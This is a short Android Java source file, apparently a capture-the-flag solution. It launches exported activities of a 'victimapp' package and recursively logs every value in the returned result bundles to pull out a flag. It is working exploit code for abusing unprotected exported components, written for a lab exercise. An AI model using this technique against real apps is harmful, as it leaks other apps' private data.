package com.example.maliciousapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CTF";

    // 1. Copy paste registerforactivity from how to get an intent from the manual
    // copy paste + full import to get the skeleton + we get the extras from result intent

    ActivityResultLauncher<Intent> launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {
                @Override
                public void onActivityResult(ActivityResult result) {
                    if (result.getData() != null) {
                        Bundle extras = result.getData().getExtras();
                        if (extras != null) {
                            // REPLACEMENT: Call the recursive function instead of just printing
                            getFlagRecursive(extras);
                        }
                    }
                }
            });


    // 2. Implement the recursive function to extract the flag
    private void getFlagRecursive(Bundle bundle) {
        if (bundle == null) return;

        for (String key: bundle.keySet()) {
            Object value = bundle.get(key);
            if (value instanceof Bundle) {
                // If the value is a Bundle, recurse into it
                getFlagRecursive((Bundle) value);
            } else {
                // Otherwise, print the value
                Log.d(TAG, "Key: " + key + ", Value: " + value);
            }
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d(TAG, "--- APP STARTED ---");

        // 3. launch intent part 1, explicit intent because it doesn not have intnet filter
        Intent intent1 = new Intent();
        intent1.setClassName("com.example.victimapp","com.example.victimapp.PartOne");
        launcher.launch(intent1);

        Intent intent3 = new Intent();
        intent3.setClassName("com.example.victimapp","com.example.victimapp.PartThree");
        launcher.launch(intent3);

        Intent intent2 = new Intent("com.example.victimapp.intent.action.JUSTASK");
        intent2.setPackage("com.example.victimapp");
        launcher.launch(intent2);

        Intent intent4 = new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
        intent4.setPackage("com.example.victimapp");
        launcher.launch(intent4);




    }



}